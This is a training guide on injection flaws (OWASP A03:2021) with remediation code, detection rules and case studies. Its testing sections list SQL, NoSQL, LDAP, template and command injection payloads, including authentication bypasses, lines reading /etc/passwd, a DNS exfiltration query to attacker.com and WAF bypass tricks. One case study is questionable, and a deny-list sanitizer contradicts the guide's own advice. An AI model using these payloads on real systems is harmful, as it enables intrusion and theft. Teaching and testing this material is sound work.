# A03:2021 - Injection

## 1. What is the Vulnerability?

Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's malicious data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

**Common Types of Injection:**

- SQL Injection (SQLi)
- NoSQL Injection
- OS Command Injection
- LDAP Injection
- Expression Language (EL) Injection
- ORM Injection
- Server-Side Template Injection (SSTI)

## 2. Root Cause Analysis

**Primary Causes:**

- **Lack of Input Validation**: User input not properly validated, filtered, or sanitized
- **Dynamic Query Construction**: Building queries by concatenating user input
- **Insufficient Output Encoding**: Not properly encoding data before interpretation
- **Overprivileged Database Accounts**: Database connections with excessive privileges
- **Missing Parameterized Queries**: Not using prepared statements or parameterized queries
- **Inadequate Escaping**: Improper escaping of special characters

**Technical Root Causes:**

- Mixing code and data in interpreter languages
- Trust in user-supplied data
- Legacy code with concatenated queries
- Insufficient security awareness among developers
- Lack of input validation frameworks

## 3. Real World Cases

### Case Study 1: Equifax Breach (2017)

- **Impact**: 147 million people's personal data exposed
- **Cause**: Apache Struts vulnerability allowed remote code execution via injection
- **Lesson**: Keep frameworks updated and implement proper input validation

### Case Study 2: Sony Pictures Hack (2014)

- **Impact**: Confidential data, emails, and movies leaked
- **Cause**: SQL injection vulnerabilities in web applications
- **Lesson**: Comprehensive security testing and secure coding practices are essential

### Case Study 3: TalkTalk Telecom Breach (2015)

- **Impact**: 4 million customer records compromised
- **Cause**: Basic SQL injection attack on customer website
- **Lesson**: Even simple injection attacks can have massive consequences

## 4. Manual Testing Methodology

### 4.1 SQL Injection Testing

```sql
-- Basic SQL injection tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*                   (use for end the comment-->)*/
admin'--
admin'/*                            */
' UNION SELECT null,null,null--

-- Time-based blind SQL injection
'; WAITFOR DELAY '00:00:10'--
' OR IF(1=1,SLEEP(10),0)--

-- Error-based SQL injection
' AND (SELECT COUNT(*) FROM sysobjects)>0--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
```

### 4.2 NoSQL Injection Testing

```javascript
// MongoDB injection examples
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$where": "return true"}}

// CouchDB injection
{"selector": {"username": {"$gt": null}}}
```

### 4.3 Command Injection Testing

```bash
# Command injection payloads
; ls -la
| id
& whoami
`cat /etc/passwd`
$(cat /etc/passwd)

# Windows command injection
& dir
| type c:\windows\system32\drivers\etc\hosts
```

### 4.4 LDAP Injection Testing

```python
# LDAP injection examples
*)(uid=*))(|(uid=*
*)(|(password=*))
*))%00

# Authentication bypass
*)(cn=*))(|(cn=*
```

### 4.5 Template Injection Testing

```python
# Server-Side Template Injection (SSTI)
{{7*7}}
{{7*'7'}}
${7*7}
<%=7*7%>
#{7*7}

# Python template injection
{{''.__class__.__mro__[2].__subclasses__()}}
{{config.items()}}
```

## 5. Remediation to Prevent and Fix

### 5.1 Use Parameterized Queries/Prepared Statements

```python
# SECURE: Parameterized query in Python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
```

`%s` acts as a placeholder for parameters instead of directly inserting user input into the SQL string. The actual values are passed separately as a tuple: (`username`, `password`). With parameterized query, this input will not bypass authentication, because the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'' OR 1=1 --' AND password = '123';
```

### 5.2 Input Validation and Sanitization

```python
# Example: Input validation framework
import re
from typing import Optional

class InputValidator:
    @staticmethod
    def validate_email(email: str) -> bool:
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    @staticmethod
    def validate_username(username: str) -> bool:
        # Allow only alphanumeric and underscore, 3-20 characters
        pattern = r'^[a-zA-Z0-9_]{3,20}$'
        return re.match(pattern, username) is not None
    
    @staticmethod
    def sanitize_sql_input(input_str: str) -> str:
        # Remove potentially dangerous characters
        dangerous_chars = ["'", '"', ';', '--', '/*', '*/']
        for char in dangerous_chars:
            input_str = input_str.replace(char, '')
        return input_str
```

### 5.3 Use ORM/Query Builders Safely

```python
# Example: Django ORM (automatically parameterized)
from django.contrib.auth.models import User

# SECURE: Using ORM
users = User.objects.filter(username=username, is_active=True)

# AVOID: Raw queries without parameters
# users = User.objects.raw("SELECT * FROM auth_user WHERE username = '%s'" % username)
```

### 5.4 Output Encoding

```html
<!-- HTML encoding for XSS prevention -->
<div>Welcome, <?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>!</div>

<!-- URL encoding for URL parameters -->
<a href="/profile?user=<?= urlencode($username) ?>">Profile</a>
```

### 5.5 Least Privilege Database Access

```sql
-- Create limited database user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON app_database.users TO 'app_user'@'localhost';
GRANT SELECT ON app_database.products TO 'app_user'@'localhost';

-- Do not grant unnecessary privileges
-- REVOKE DROP, CREATE, ALTER ON *.* FROM 'app_user'@'localhost';
```

## 6. Prevention Best Practices

### 6.1 Secure Coding Practices

- Use parameterized queries/prepared statements exclusively
- Implement comprehensive input validation
- Apply principle of least privilege
- Use allow-lists instead of deny-lists for input validation
- Implement proper error handling (don't leak system information)

### 6.2 Framework-Specific Protections

- Use ORM frameworks that automatically handle parameterization
- Implement Content Security Policy (CSP) for additional XSS protection
- Use framework-provided input validation and sanitization functions
- Enable framework security features and configurations

### 6.3 Development Process

- Security code reviews focusing on injection vulnerabilities
- Static Application Security Testing (SAST) integration
- Dynamic Application Security Testing (DAST) integration
- Security training for developers
- Secure coding standards and guidelines

## 7. Testing Tools and Techniques

### 7.1 Automated Testing Tools

- **SQLMap**: Automated SQL injection testing tool
- **NoSQLMap**: NoSQL injection testing tool
- **Commix**: Command injection testing tool
- **Burp Suite**: Comprehensive web application security testing
- **OWASP ZAP**: Open-source security testing proxy

### 7.2 Static Analysis Tools

- **SonarQube**: Code quality and security analysis
- **Checkmarx**: Static Application Security Testing
- **Veracode**: Static and dynamic security testing
- **Semgrep**: Lightweight static analysis tool

### 7.3 Manual Testing Checklist

- [ ] Test all input fields for SQL injection
- [ ] Test URL parameters and headers
- [ ] Test file upload functionality
- [ ] Test search functionality
- [ ] Test login and authentication forms
- [ ] Test API endpoints
- [ ] Test different injection types (SQL, NoSQL, Command, LDAP)
- [ ] Test both GET and POST parameters

## 8. Advanced Injection Techniques

### 8.1 Blind SQL Injection

```sql
-- Boolean-based blind injection
' AND (SELECT SUBSTRING(user(),1,1))='r'--

-- Time-based blind injection
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- DNS-based blind injection (MySQL)
' AND (SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\share')))--
```

### 8.2 Second-Order Injection

```sql
-- First request: Store malicious payload
INSERT INTO users (username) VALUES ('admin''--');

-- Second request: Payload executes when data is used
SELECT * FROM users WHERE username = 'admin'--'
```

### 8.3 WAF Bypass Techniques

```sql
-- Comment variation
/**/UNION/**/SELECT/**/

-- Case variation
UnIoN sElEcT

-- Encoding
%55%4E%49%4F%4E (URL encoded UNION)

-- Alternative keywords
UNION ALL SELECT vs UNION SELECT
```

## 9. Code Examples and Fixes

### 9.1 Vulnerable Code Examples

```php
// VULNERABLE: SQL injection via string concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($connection, $query);

// VULNERABLE: Command injection
$output = shell_exec("ping -c 4 " . $_POST['host']);

// VULNERABLE: LDAP injection
$filter = "(&(uid=" . $username . ")(password=" . $password . "))";
$search = ldap_search($connection, $base_dn, $filter);
```

### 9.2 Secure Code Examples

```php
// SECURE: Parameterized SQL query
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();

// SECURE: Input validation and safe command execution
function pingHost($host) {
    // Validate input
    if (!filter_var($host, FILTER_VALIDATE_IP)) {
        throw new InvalidArgumentException("Invalid IP address");
    }
    // Use escapeshellarg for additional safety
    $output = shell_exec("ping -c 4 " . escapeshellarg($host));
    return $output;
}

// SECURE: LDAP input validation and escaping
function ldapEscape($str) {
    return str_replace(['\\', '*', '(', ')', '\0'], 
                      ['\\5c', '\\2a', '\\28', '\\29', '\\00'], $str);
}
$filter = "(&(uid=" . ldapEscape($username) . ")(password=" . ldapEscape($password) . "))";
```

## 10. Framework-Specific Examples

### 10.1 Node.js/Express Security

```javascript
// SECURE: Using Sequelize ORM
const { User } = require('./models');

// Safe parameterized query
const user = await User.findOne({
  where: {
    username: req.body.username,
    email: req.body.email
  }
});

// Input validation with Joi
const Joi = require('joi');

const schema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().min(6).required()
});

const { error, value } = schema.validate(req.body);
if (error) {
  return res.status(400).json({ error: error.details[0].message });
}
```

### 10.2 Python Flask Security

```python
# SECURE: Using SQLAlchemy ORM
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text

# Safe ORM query
user = User.query.filter_by(username=username).first()

# Safe raw query with parameters
result = db.session.execute(
    text("SELECT * FROM users WHERE username = :username"),
    {"username": username}
)

# Input validation with marshmallow
from marshmallow import Schema, fields, ValidationError

class UserSchema(Schema):
    username = fields.Str(required=True, validate=validate.Length(min=3, max=20))
    email = fields.Email(required=True)
    password = fields.Str(required=True, validate=validate.Length(min=6))

schema = UserSchema()
try:
    result = schema.load(request.json)
except ValidationError as err:
    return jsonify(err.messages), 400
```

## 11. Testing Payloads by Category

### 11.1 SQL Injection Payloads

```sql
-- Authentication bypass
admin'--
admin'/*
' OR 1=1--
' OR 'x'='x
' OR 1=1#

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--

-- Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Boolean blind injection
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(user(),1,1))='r'--
```

### 11.2 NoSQL Injection Payloads

```javascript
// MongoDB authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$in": ["admin", "administrator"]}}
{"$or": [{"username": "admin"}, {"username": "administrator"}]}

// MongoDB data extraction
{"username": {"$regex": "^a.*"}}
{"username": {"$where": "this.username.length < 5"}}
```

### 11.3 Command Injection Payloads

```bash
# Unix/Linux command injection
; cat /etc/passwd
| cat /etc/passwd
& cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)

# Windows command injection
& type c:\windows\system32\drivers\etc\hosts
| dir c:\
&& net user

# Time delay verification
; sleep 10
& timeout 10
```

## 12. Compliance and Standards

### 12.1 Regulatory Requirements

- **PCI DSS**: Requirement 6.5.1 - Injection flaws
- **OWASP ASVS**: Various verification requirements for input validation
- **ISO 27001**: Controls for secure development practices
- **NIST Cybersecurity Framework**: Protective controls for secure coding

### 12.2 Industry Standards

- **CWE-89**: SQL Injection
- **CWE-78**: OS Command Injection  
- **CWE-90**: LDAP Injection
- **SANS Top 25**: Multiple injection-related weaknesses

## 13. Monitoring and Detection

### 13.1 WAF Rules and Signatures

```bash
# ModSecurity rules for SQL injection detection
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# Command injection detection
SecRule ARGS "@rx (?:\b(?:n?cat|tail|echo|print|printf|head|file|less|more|[nm]awk|sed|sort|cut|grep|wget|curl|nc|netcat|nslookup|dig|host|telnet|ssh|scp|rsync)\b|[|;&`$()])" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'Command Injection Attack Detected'"
```

### 13.2 Database Monitoring

- Monitor for unusual SQL patterns
- Alert on excessive failed authentication attempts
- Log and analyze database access patterns
- Implement database activity monitoring (DAM)
- Set up alerts for privilege escalation attempts

### 13.3 Application-Level Monitoring

```python
# Example: Application-level injection attempt logging
import logging
import re

def detect_injection_attempt(user_input):
    # SQL injection patterns
    sql_patterns = [
        r"('|(\\')|(;|\\x3b)|(\\x27)|(\\x3D)|(\\x3C)|(\\x3E)|(\\x22)|(\\x2B)|(\\x0D)|(\\x0A)|(\\x5C)|(\\x00))",
        r"(union|select|insert|update|delete|drop|create|alter|exec|execute)",
        r"(script|javascript|vbscript|onload|onerror|onclick)"
    ]
    
    for pattern in sql_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            logging.warning(f"Potential injection attempt detected: {user_input}")
            return True
    return False
```

## 14. References and Further Reading

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [NIST SP 800-53: Security Controls for Federal Information Systems](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
- [SANS SQL Injection Prevention Cheat Sheet](https://www.sans.org/white-papers/2651/)
- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
